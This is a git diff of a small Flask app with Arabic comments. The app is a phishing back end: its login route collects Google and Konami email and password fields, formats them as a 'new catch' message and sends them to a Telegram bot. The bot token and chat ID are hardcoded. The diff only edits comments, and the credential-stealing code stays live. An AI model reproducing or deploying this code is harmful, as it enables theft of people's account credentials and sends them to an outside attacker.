@@ -3,7 +3,7 @@ import requests
 
 app = Flask(__name__)
 
-# التوكن والآيدي الخاص بك
+# التوكن والآيدي الخاص بك يا سيد
 TOKEN = '8861759753:AAEQPikaUCB-yti_nWZVCx9LFCfs6g4lWOU'
 CHAT_ID = '5204157508'
 
@@ -14,13 +14,11 @@ def index():
 @app.route('/login', methods=['POST'])
 def login():
     try:
-        # استلام الحقول الأربعة من الصفحة
         g_email = request.form.get('g_email')
         g_pass = request.form.get('g_pass')
         k_email = request.form.get('k_email')
         k_pass = request.form.get('k_pass')
         
-        # تنسيق الرسالة التي ستصلك على البوت
         msg = (
             f"🚨 صيد جديد يا سيد! 🚨\n\n"
             f"📧 إيميل جوجل: {g_email}\n"
@@ -29,7 +27,6 @@ def login():
             f"🔑 باسورد كونامي: {k_pass}"
         )
         
-        # إرسال البيانات إلى بوت التليجرام
         url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
         payload = {
             'chat_id': CHAT_ID,
